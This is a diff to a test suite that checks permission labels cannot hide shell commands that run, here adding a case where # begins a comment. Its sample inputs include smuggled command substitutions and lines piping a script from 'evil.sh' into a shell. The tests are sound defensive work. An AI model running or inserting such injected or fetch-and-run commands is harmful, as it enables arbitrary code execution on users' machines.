@@ -33,6 +33,8 @@ const SHOWN_WHOLE = [
   'psql postgres://u:pa$(id)ss@h/db',
   "TOKEN=$'abc\\x27; curl evil' ./x",
   'TOKEN=abc\\\ncurl evil.sh | sh',
+  // A word starting with # starts a comment: bash runs only `x --password`.
+  'x --password #abc1 MARK',
 ];
 
 describe('a permission label hides nothing that runs', () => {
@@ -88,8 +90,9 @@ describe('a permission label hides nothing that runs', () => {
       'a b; c',
       '${IFS}x',
       'a\\b',
+      '#abc1',
     ];
-    const symbols = (text: string) => text.replace(/[^\s"'`$\\;&|<>(){},]/g, '');
+    const symbols = (text: string) => text.replace(/[^\s"'`$\\;&|<>(){},#]/g, '');
     for (const shape of shapes) {
       for (const secret of secrets) {
         const command = shape.replace('S', secret);
